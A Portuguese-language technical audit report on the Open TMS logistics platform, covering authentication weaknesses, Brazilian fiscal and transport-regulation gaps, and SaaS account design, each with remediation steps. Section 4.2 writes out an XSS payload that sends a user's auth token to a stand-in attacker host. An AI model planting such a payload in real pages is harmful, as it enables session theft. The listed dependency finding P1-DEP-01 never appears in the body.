# ANÁLISE FORENSE DOS 10 ACHADOS P1 (ALTA SEVERIDADE E LACUNAS CRÍTICAS)
**Segunda Auditoria Técnica Independente — Open TMS**  
**Data:** 10 de Novembro de 2026  
**Commit Analisado:** `ed831c2b9f77721cc5c9d87c49f9aa3bde8124a0`  
**Escopo:** P1-SEC-03 a P1-SEC-06, P1-BRA-01 a P1-BRA-03, P1-SAA-01 a P1-SAA-02 e P1-DEP-01

---

## 1. INTRODUÇÃO

Os achados de nível **P1** dividem-se em quatro grupos fundamentais:
1. **Segurança de Aplicação e Autenticação (P1-SEC-03 a P1-SEC-06):** Falhas em criptografia de senhas, gerenciamento de tokens JWT, armazenamento no frontend e ausência de limitadores de taxa.
2. **Lacunas do Domínio Logístico Brasileiro (P1-BRA-01 a P1-BRA-03):** Incompatibilidades cadastrais, ausência de documentos fiscais eletrônicos da SEFAZ e desatendimento a normas regulatórias da ANTT (CIOT, RNTRC, Vale-Pedágio).
3. **Lacunas de Arquitetura Comercial SaaS (P1-SAA-01 e P1-SAA-02):** Falta de infraestrutura de cobrança e rigidez do modelo de contas multiempresa.
4. **Vulnerabilidades de Dependências (P1-DEP-01):** Riscos em pacotes do ecossistema Node.js.

---

## 2. [P1-SEC-03] ALGORITMO FRACO DE HASH DE SENHA (HMAC-SHA256)

### 2.1. Investigação Forense no Código
O sistema possui três serviços de autenticação independentes que implementam a mesma rotina customizada de derivação de chave:
- `backend/src/services/auth/AuthService.ts` (linhas 66–72)
- `backend/src/services/auth/CustomerAuthService.ts` (linhas 42–48)
- `backend/src/services/auth/CarrierAuthService.ts` (linhas 42–48)

#### Código Atual:
```typescript
// AuthService.ts:66-70
export class AuthService {
  hashPassword(password: string, salt: string): string {
    return crypto.createHmac('sha256', salt).update(password).digest('hex');
  }

  verifyPassword(password: string, salt: string, hash: string): boolean {
    const computed = this.hashPassword(password, salt);
    return crypto.timingSafeEqual(Buffer.from(computed), Buffer.from(hash));
  }
}
```

### 2.2. Por que esta Abordagem é Insegura
1. **Ausência de Custo Computacional (Work Factor):** O HMAC-SHA256 é uma função criptográfica projetada para ser ultra rápida (milhões de operações por segundo para verificação de integridade de mensagens).
2. **Vulnerabilidade a Quebra em GPU/ASIC:** Em um hardware moderno (como uma placa NVIDIA RTX 4090), um atacante consegue calcular mais de **20 bilhões de hashes SHA-256 por segundo**. Uma senha de 8 caracteres alfanuméricos pode ser recuperada em questão de minutos.
3. **Não Conformidade com Padrões Internacionais:** OWASP e NIST SP 800-63B recomendam estritamente o uso de funções com consumo de memória (Memory-Hard Functions), lideradas pelo **Argon2id** (ou alternativamente scrypt ou bcrypt com cost >= 12).

### 2.3. Estratégia de Migração Transparente (Zero Password Reset)
Para atualizar o algoritmo sem forçar o recadastro ou redefinição de senhas de usuários existentes:
1. Adotar a biblioteca `argon2` nativa.
2. Na verificação de login:
   - Se a string de hash gravada no banco iniciar com `$argon2id$`, valida via `argon2.verify(hash, password)`.
   - Se for o hash legado (hexadecimal de 64 caracteres), valida via `crypto.timingSafeEqual` com o HMAC-SHA256 antigo.
   - **Re-hash On-The-Fly:** Se a validação do hash legado for bem-sucedida, gera imediatamente o novo hash usando `argon2.hash(password, { type: argon2.argon2id, memoryCost: 65536, timeCost: 3 })`, salva no registro do usuário e descarta o salt legado.

---

## 3. [P1-SEC-04] SESSÕES JWT STATELESS DE 12H E LOGOUT FICTÍCIO

### 3.1. Investigação Forense no Código
- `backend/src/auth/jwt.ts` (linhas 38–45):
  ```typescript
  const TOKEN_EXPIRY_HOURS = 12;

  export function generateToken(payload: AuthTokenPayload): string {
    return jwt.sign(payload, JWT_SECRET, { expiresIn: `${TOKEN_EXPIRY_HOURS}h` });
  }
  ```
- `backend/src/routes/auth.ts` (linhas 130–136):
  ```typescript
  fastify.post('/logout', async () => {
    return { data: { success: true } };
  });
  ```

### 3.2. Mecanismo de Falha e Risco
1. O token emitido tem vida útil fixa de 12 horas.
2. A API valida o token apenas decodificando a assinatura estática com a chave secreta (`jwt.verify`). Não há consulta de estado, lista de revogação ou validação contra o banco.
3. O endpoint `POST /logout` é puramente cosmético: retorna um JSON `{ success: true }` sem executar nenhuma ação de invalidação no servidor.
4. **Vetor de Risco:** Caso um funcionário de uma transportadora seja demitido ou um dispositivo corporativo seja roubado, o token capturado permanecerá totalmente funcional por até 12 horas para extrair faturas, dados de clientes e ordens de frete.

### 3.3. Especificação de Remediação Defensiva
1. **Redução da Validade do Access Token:** Reduzir o tempo de expiração do JWT de acesso para **15 minutos**.
2. **Implementação de Refresh Tokens com Rotação (RFC 6749 / 6819):**
   - Criar a tabela `RefreshToken` vinculada ao usuário, armazenando hash da chave, identificador de dispositivo (User-Agent/IP), data de expiração (7 a 14 dias) e flag de revogação.
   - A cada renovação de sessão, o refresh token utilizado é invalidado e um novo é emitido. Se um refresh token já consumido for apresentado novamente, o sistema detecta um ataque de replay e revoga toda a árvore de sessões do usuário imediatamente.
3. **Logout Real:** O endpoint `/logout` marca o refresh token ativo como revogado no banco de dados.

---

## 4. [P1-SEC-05] TOKENS NO `localStorage` E VULNERABILIDADE A XSS

### 4.1. Investigação Forense no Código
- `frontend/src/features/auth/useAuth.ts` (linhas 35–42):
  ```typescript
  const login = async (credentials) => {
    const res = await api.post('/auth/login', credentials);
    const { token, user } = res.data;
    localStorage.setItem('auth_token', token); // Armazenamento inseguro
    setToken(token);
    setUser(user);
  };
  ```
- `frontend/src/features/settings/vnext/VNextEmailTemplates.tsx` (linha 378):
  ```tsx
  <div className="preview-container">
    <div dangerouslySetInnerHTML={{ __html: previewHtml }} />
  </div>
  ```

### 4.2. Mecanismo de Falha e Risco
1. O armazenamento em `localStorage` não possui proteção contra leitura por scripts. Qualquer código executado na aba do navegador tem acesso ao valor de `localStorage.getItem('auth_token')`.
2. A renderização de templates customizáveis via `dangerouslySetInnerHTML` sem passar por um sanitizador estrito (como DOMPurify) cria uma brecha para **Stored XSS** (Cross-Site Scripting Persistente).
3. **Cenário de Ataque:** Um administrador mal-intencionado ou um atacante que consiga injetar código em um template de email compartilhado insere `<img src=x onerror="fetch('https://attacker.com/?t='+localStorage.getItem('auth_token'))">`. Quando outros operadores visualizarem o template, seus tokens serão exfiltrados silenciosamente.

### 4.3. Especificação de Remediação Defensiva
1. **Migração para Cookies `httpOnly`:**
   - O backend deve emitir o Refresh Token em um cookie seguro:
     `Set-Cookie: refresh_token=...; HttpOnly; Secure; SameSite=Lax; Path=/api/v1/auth/refresh`.
   - Por ser `HttpOnly`, o JavaScript do navegador é impedido de ler a credencial, neutralizando o roubo de sessão mesmo em caso de XSS.
2. **Sanitização de HTML no Frontend:**
   - Adicionar o pacote `dompurify` e seu wrapper React.
   - Refatorar qualquer uso de `dangerouslySetInnerHTML` para:
     ```tsx
     import DOMPurify from 'dompurify';
     <div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(previewHtml) }} />
     ```

---

## 5. [P1-SEC-06] AUSÊNCIA DE RATE LIMITING GLOBAL NA API

### 5.1. Investigação Forense no Código
- No `package.json`, o pacote `@fastify/rate-limit` consta como dependência.
- No arquivo `backend/src/index.ts`, o plugin **não é registrado** no servidor Fastify global.
- Apenas o arquivo `backend/src/routes/publicShipmentShare.ts` possui uma configuração isolada de rate limit.
- Todos os endpoints administrativos, rotas de login (`/auth/login`, `/customer-portal/auth/login`, `/carrier-portal/auth/login`) e rotas EDI operam sem qualquer proteção de frequência de requisições.

### 5.2. Impacto e Riscos
- **Ataques de Força Bruta e Credential Stuffing:** Um atacante pode testar milhares de combinações de email e senha por minuto sem que a API imponha bloqueio temporário ou retardo.
- **Negação de Serviço (DoS):** Requisições volumétricas contra endpoints pesados de geração de relatórios ou listagem de cargas podem saturar o pool de conexões do PostgreSQL e derrubar a aplicação.

### 5.3. Especificação de Remediação Defensiva
Registrar o `@fastify/rate-limit` globalmente com limites por contexto:
1. **Padrão Geral da API:** 300 requisições por minuto por IP/Tenant.
2. **Rotas de Autenticação (`/api/v1/*/auth/login`):** Limite estrito de 5 tentativas por minuto por IP/usuário, com cabeçalhos `Retry-After`.
3. **Rotas EDI:** 60 requisições por minuto por chave de parceiro.

---

## 6. [P1-BRA-01, P1-BRA-02, P1-BRA-03] LACUNAS DO ECOSSISTEMA LOGÍSTICO BRASILEIRO

### 6.1. [P1-BRA-01] Incompatibilidade Cadastral Fiscal
- **Situação no Código:** O schema do Prisma foi projetado para os Estados Unidos:
  - Endereços utilizam `zipCode` (5 dígitos), `state` (2 letras padrão US), `country` default 'US'.
  - Entidades de clientes e transportadoras usam `taxId` livre sem máscara ou validação de dígitos verificadores.
  - Veículos usam identificadores norte-americanos (`vin`, `dotNumber`, `mcNumber`).
- **Remediação Obrigatória para o Brasil:**
  - Validação estrita de **CPF** (11 dígitos, algoritmo módulo 11) para motoristas e clientes pessoas físicas.
  - Validação de **CNPJ** (14 dígitos, algoritmo módulo 11) para empresas embarcadoras e transportadoras.
  - Cadastro de **Inscrição Estadual (IE)** com algoritmo de validação específico por Unidade Federativa (UF).
  - Validação de **CEP** (8 dígitos) com serviço de autocompletar de endereços (ViaCEP / Correios).
  - Tabela ou enum de **Municípios do IBGE** (código de 7 dígitos, fundamental para a SEFAZ).
  - Validação de **Placas de Veículos**: padrão antigo (`ABC-1234`) e padrão Mercosul (`ABC1D23`).

---

### 6.2. [P1-BRA-02] Ausência de Documentos Fiscais Eletrônicos (CT-e / MDF-e / NFS-e)
- **Situação no Código:** A aplicação utiliza os conceitos de `Bill of Lading` (BOL) e faturas comerciais simples (`Invoice`). No Brasil, nenhum frete rodoviário de cargas pode transitar legalmente sem a emissão de documentos fiscais eletrônicos autorizados pela SEFAZ (Secretaria de Estado da Fazenda).
- **Remediação Obrigatória para o Brasil:**
  1. **CT-e (Conhecimento de Transporte Eletrônico - Modelo 57):**
     - Emissão do XML nos padrões do Manual de Orientação do Contribuinte (MOC).
     - Assinatura digital com Certificado Digital A1 (PKCS#12, arquivo `.pfx`).
     - Comunicação com os Web Services da SEFAZ via SOAP / TLS 1.2.
     - Suporte a contingência (SVC-AN / SVC-RS).
     - Geração do **DACTE** (Documento Auxiliar do CT-e) em PDF com código de barras padrão 128C.
  2. **MDF-e (Manifesto Eletrônico de Documentos Fiscais - Modelo 58):**
     - Obrigatório para transporte interestadual ou intermunicipal de carga fracionada/lotação.
     - Vinculação de CT-es, NF-es dos clientes, dados do veículo e do motorista condutor.
     - Eventos de Encerramento, Cancelamento e Inclusão de Condutor.
     - Geração do **DAMDFE** em PDF.

---

### 6.3. [P1-BRA-03] Ausência de Gestão de TAC, RNTRC, CIOT e Vale-Pedágio
- **Situação no Código:** Não existem entidades que representem o motorista autônomo (TAC - Transportador Autônomo de Cargas) sob a égide da Lei Federal nº 11.442/2007.
- **Remediação Obrigatória para o Brasil:**
  1. **RNTRC (Registro Nacional de Transportadores Rodoviários de Cargas):**
     - Cadastro e validação do número de registro emitido pela ANTT para frotas próprias e terceirizadas.
  2. **CIOT (Código Identificador da Operação de Transporte):**
     - Obrigatório pela Resolução ANTT nº 5.862/2019 para qualquer contratação de TAC ou equiparado.
     - Integração com IPEF (Instituição de Pagamento Eletrônico de Frete) para geração do código antes do início da viagem.
  3. **Vale-Pedágio Obrigatório (Lei nº 10.209/2001):**
     - O valor do pedágio deve ser antecipado ao motorista autônomo, não podendo ser incorporado ao frete bruto.
     - Registro do número de comprovante da concessionária/operadora no CT-e e MDF-e.

---

## 7. [P1-SAA-01 E P1-SAA-02] ARQUITETURA COMERCIAL SAAS E CONTAS DE USUÁRIO

### 7.1. [P1-SAA-01] Ausência de Estrutura de Cobrança e Planos
- **Situação no Código:** Não há qualquer camada comercial no Open TMS atual. Não há catálogo de planos (ex: Básico, Profissional, Frotas), nem controle de licenças ou limites de uso.
- **Remediação:**
  - Criar os modelos `Plan`, `Subscription`, `SubscriptionInvoice`, `UsageQuota`.
  - Integrar um provedor de pagamentos com forte presença nacional (ex: Asaas, Pagar.me ou Stripe Brasil), suportando **PIX** (indispensável para o mercado de transporte no Brasil), Boleto Bancário e Cartão de Crédito.
  - Implementar middleware de verificação de limites (ex: contagem de veículos ativos ou CT-es emitidos no mês).

---

### 7.2. [P1-SAA-02] Rigidez Estrutural de Vínculo Usuário-Organização
- **Situação no Código:**
  ```prisma
  model User {
    id             String       @id @default(uuid())
    email          String       @unique // Impossibilita mesmo email em 2 tenants
    organizationId String
    organization   Organization @relation(fields: [organizationId], references: [id])
  }
  ```
- **Problema de Negócio:**
  - Motoristas autônomos prestam serviço para múltiplas transportadoras.
  - Contadores, despachantes e operadores logísticos operam frequentemente com filiais ou transportadoras parceiras distintas.
  - No modelo atual, uma pessoa precisa criar um email diferente para cada transportadora que desejar acessar na plataforma.
- **Remediação Arquitetural:**
  - Desacoplar `User` de `Organization`.
  - Criar a tabela `Membership`:
    ```prisma
    model Membership {
      id             String       @id @default(uuid())
      userId         String
      organizationId String
      role           String       // ADMIN, DISPATCHER, DRIVER, ACCOUNTANT
      user           User         @relation(fields: [userId], references: [id])
      organization   Organization @relation(fields: [organizationId], references: [id])

      @@unique([userId, organizationId])
    }
    ```
  - Permitir troca dinâmica de tenant ativo no topo da interface através do endpoint `POST /api/v1/auth/switch-org`.

---

## 8. SÍNTESE FORENSE DOS ACHADOS P1

Todos os 10 achados P1 foram **validados e confirmados**. As falhas de segurança exigem correções técnicas diretas no backend (PRs 01, 04 e 05), enquanto as lacunas do mercado brasileiro e de SaaS comercial definem os módulos estruturantes a serem desenvolvidos nos PRs 07 e 08.
